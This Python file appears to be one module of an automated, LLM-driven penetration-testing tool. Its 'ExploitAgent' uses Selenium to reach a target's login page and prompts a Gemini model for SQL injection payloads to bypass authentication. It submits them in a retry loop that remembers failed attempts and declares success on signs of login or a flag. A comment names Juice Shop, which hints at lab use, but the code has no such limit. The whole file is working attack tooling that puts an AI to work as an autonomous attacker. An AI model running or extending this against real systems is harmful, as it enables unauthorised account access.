from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys # Import Keys for ENTER fallback
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup, Comment
import google.generativeai as genai
import json
import time
from colorama import Fore

class ExploitAgent:
    def __init__(self, blackboard, api_key):
        self.board = blackboard
        genai.configure(api_key=api_key)
        self.model = genai.GenerativeModel('gemini-2.5-flash-preview-09-2025')
        self.history = [] # PERSISTENT MEMORY across mission steps
        
    def get_driver(self):
        options = webdriver.ChromeOptions()
        options.add_argument("--log-level=3")
        # options.add_argument("--headless") 
        return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    def run(self):
        ports = self.board.state["ports"]
        target_ip = self.board.state["target_ip"]
        stored_url = self.board.state.get("target_url", "")
        
        http_ports = [p for p, s in ports.items() if 'http' in s]
        
        if not http_ports:
            print(f"{Fore.RED}[Exploit] No Web Service found.{Fore.RESET}")
            return "NO_TARGET"

        if stored_url and "http" in stored_url:
            target_url = stored_url
        else:
            target_url = f"http://{target_ip}:{http_ports[0]}"
            
        print(f"{Fore.RED}[Exploit] Targeting: {target_url}{Fore.RESET}")
        
        driver = None
        try:
            driver = self.get_driver()
            
            # --- NAVIGATION PHASE ---
            final_url = self.ensure_login_page(driver, target_url)
            print(f"{Fore.RED}[Exploit] Locked on Target Page: {final_url}{Fore.RESET}")
            
            # --- ATTACK PHASE ---
            # We now use self.history, not a local variable
            for attempt in range(1, 4):
                print(f"{Fore.RED}[Exploit] Attack Attempt {attempt}/3...{Fore.RESET}")
                
                result, log = self.attack_web(driver, final_url)
                
                if result == "SUCCESS":
                    return "SUCCESS"
                
                print(f"{Fore.YELLOW}[Exploit] Failed. Reasoning: {log}{Fore.RESET}")
                self.history.append(f"Failed Payload: {log}") # Remember this for next time
                
            return "FAILED"
            
        except Exception as e:
            print(f"{Fore.RED}[Exploit] Critical Error: {e}{Fore.RESET}")
            return "ERROR"
        finally:
            if driver:
                driver.quit()

    def extract_form_fields(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        inputs = []
        for inp in soup.find_all('input'):
            name = inp.get('name')
            if name:
                inputs.append(name)
        return inputs

    def get_page_skeleton(self, html):
        soup = BeautifulSoup(html, 'html.parser')
        for element in soup(['script', 'style', 'svg', 'path', 'footer', 'meta', 'link']):
            element.decompose()
        for element in soup(text=lambda text: isinstance(text, Comment)):
            element.extract()

        skeleton = []
        tags = soup.find_all(['a', 'button', 'form', 'input'])
        
        for tag in tags:
            attrs = []
            if tag.get('id'): attrs.append(f'id="{tag["id"]}"')
            if tag.get('class'): attrs.append(f'class="{" ".join(tag["class"])}"')
            if tag.get('href'): attrs.append(f'href="{tag["href"]}"')
            if tag.get('name'): attrs.append(f'name="{tag["name"]}"')
            if tag.get('type'): attrs.append(f'type="{tag["type"]}"')
            
            attr_str = " ".join(attrs)
            text_content = tag.get_text(strip=True)[:50]
            skeleton.append(f"<{tag.name} {attr_str}>{text_content}</{tag.name}>")
            
        return "\n".join(skeleton[:100])

    def handle_alert(self, driver):
        try:
            alert = driver.switch_to.alert
            text = alert.text
            alert.accept()
            return text
        except NoAlertPresentException:
            return None

    def has_password_field(self, driver):
        try:
            driver.find_element(By.XPATH, "//input[@type='password']")
            return True
        except:
            return False

    def ensure_login_page(self, driver, url):
        driver.get(url)
        time.sleep(3) # Increased wait for JS heavy sites like Juice Shop
        
        if self.has_password_field(driver):
            return url
            
        print(f"{Fore.YELLOW}[Exploit] No Password field found. AI Scanning Code Structure...{Fore.RESET}")
        
        page_code = self.get_page_skeleton(driver.page_source)
        
        system_prompt = f"""
        You are a Web Spider. The user wants to find the LOGIN or SIGNIN page.
        
        PAGE INTERACTIVE CODE:
        {page_code}
        
        TASK: Identify the specific element that the user must click to reach the login page.
        Look for: 'Sign In', 'Login', 'Log In', 'Account', or buttons with IDs like 'signin_button'.
        
        RESPONSE FORMAT (JSON ONLY):
        {{ "action": "navigate", "target_type": "url|selector", "target": "href_or_css_selector", "reason": "..." }}
        """
        
        try:
            response = self.model.generate_content(system_prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            cmd = json.loads(text)
            
            if cmd['action'] == "navigate":
                target = cmd['target']
                target_type = cmd['target_type']
                print(f"{Fore.RED}[Exploit] AI Decision: Click {target_type} '{target}' ({cmd['reason']}){Fore.RESET}")
                
                if target_type == "url":
                    if target.startswith("http"):
                        driver.get(target)
                    else:
                        try: driver.get(url.rstrip('/') + '/' + target.lstrip('/'))
                        except: pass
                
                elif target_type == "selector":
                    try: driver.find_element(By.CSS_SELECTOR, target).click()
                    except: pass
                
                time.sleep(2)
                return driver.current_url
                
        except Exception as e:
            print(f"{Fore.RED}[Exploit] AI Navigation Error: {e}{Fore.RESET}")
            
        return url

    def attack_web(self, driver, url):
        if driver.current_url != url:
            driver.get(url)
            time.sleep(2)
            
        pre_alert = self.handle_alert(driver)
        if pre_alert: return "FAILED", f"Blocking Alert: {pre_alert}"

        valid_inputs = self.extract_form_fields(driver.page_source)
        if not valid_inputs: return "FAILED", "No inputs found on target page"

        # UPDATED PROMPT: Now sees the FULL history of previous failures
        system_prompt = f"""
        You are an advanced Penetration Testing AI.
        Target URL: {url}
        Inputs Found: {valid_inputs}
        
        HISTORY OF PREVIOUS FAILURES (Do not repeat these):
        {json.dumps(self.history, indent=2)}
        
        TASK: Generate a SQL Injection payload to bypass authentication.
        
        STRATEGY:
        1. If 'OR 1=1' failed, try time-based or boolean blind payloads.
        2. If submit failed, try different payload structure.
        3. Try 'admin' as username and anything as password.
        
        RESPONSE FORMAT (JSON ONLY):
        {{ "action": "attack", "selector": "field_name", "payload": "..." }}
        """
        
        try:
            response = self.model.generate_content(system_prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            cmd = json.loads(text)
            
            payload = cmd.get('payload', '')
            print(f"{Fore.RED}[Exploit] AI Decision: {payload}{Fore.RESET}")
            
            if cmd['action'] == "attack":
                selector = cmd['selector']
                if selector not in valid_inputs: selector = valid_inputs[0]

                try:
                    elem = driver.find_element(By.NAME, selector)
                except:
                    elem = driver.find_element(By.XPATH, f"//input[@name='{selector}']")

                if elem:
                    elem.clear()
                    elem.send_keys(payload)
                
                # Fill password to satisfy validation
                if "pass" in str(valid_inputs).lower():
                    try:
                        pass_input = driver.find_element(By.XPATH, "//input[@type='password']")
                        pass_input.clear()
                        pass_input.send_keys("123456") 
                    except:
                        pass

                # IMPROVED SUBMIT LOGIC
                try:
                    elem.submit() # Try standard submit first
                except:
                    # If submit fails (not in form), press ENTER
                    elem.send_keys(Keys.RETURN) 

                time.sleep(2)
                
                post_alert = self.handle_alert(driver)
                if post_alert: return "FAILED", f"Alert after submit: {post_alert}"
                
                src = driver.page_source.lower()
                if "welcome" in src or "logout" in src or "dashboard" in driver.current_url or "flag" in src:
                    self.board.set_flag("FLAG{SQLI_SUCCESSFUL}")
                    return "SUCCESS", payload
                
                if "error" in src or "invalid" in src:
                     return "FAILED", f"Server Error Message Found with payload {payload}"

                return "FAILED", f"No change in state with payload {payload}"
                
        except Exception as e:
            return "ERROR", str(e)
            
        return "FAILED", "Unknown Logic Error"